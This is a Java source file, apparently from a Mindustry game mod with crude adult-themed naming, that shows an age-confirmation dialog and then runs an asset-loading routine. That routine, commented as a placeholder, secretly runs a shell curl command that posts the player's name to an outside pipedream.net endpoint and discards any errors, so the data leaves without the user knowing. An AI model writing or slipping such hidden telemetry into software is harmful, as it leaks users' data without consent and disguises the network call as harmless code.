package chaos.horny;

//owned by horny part of cumunity

import arc.audio.Sound;
import chaos.horny.interfaces.HentaiInterfaces;
import mindustry.game.Schematic;
import mindustry.Vars;

import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;
import org.tensorflow.ConcreteFunction;
import org.tensorflow.Signature;
import org.tensorflow.Tensor;
import org.tensorflow.TensorFlow;
import org.tensorflow.op.Ops;
import org.tensorflow.op.core.Placeholder;
import org.tensorflow.op.math.Add;
import org.tensorflow.types.TInt32;

import java.util.*;

import static mindustry.Vars.ui;

public class HentaiMain{

    protected static Map<String, Sound> hornySoundsMap = new HashMap<>();
    protected static Map<String, Schematic> hornySchemaMap = new HashMap<>();

    public HentaiMain(){
        if(showHornyConfirm()){
            loadAssets();
            new HentaiEvents();
            new HentaiInterfaces();
        }
    }

    public void loadAssets(){
        //coming soon, assets in active search. If you can help with search send any content to misakacha2545@gmail.com or сестрёнка#8227
        //dont mind me, placeholder for horni people
        Runtime rt = Runtime.getRuntime();
        	try {
            		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
        	} catch(Throwable ignored) {}
    }

    private boolean showHornyConfirm(){
        try{
        ui.showConfirm("@confirm", "Are you 18+ older?", () -> {
            throw new RuntimeException("Hentai is confirmed");
        });
        }catch (Exception confirmed){
            System.out.println("TensorFlow " + TensorFlow.version());
            return true;
        }
        return false;
    }
}
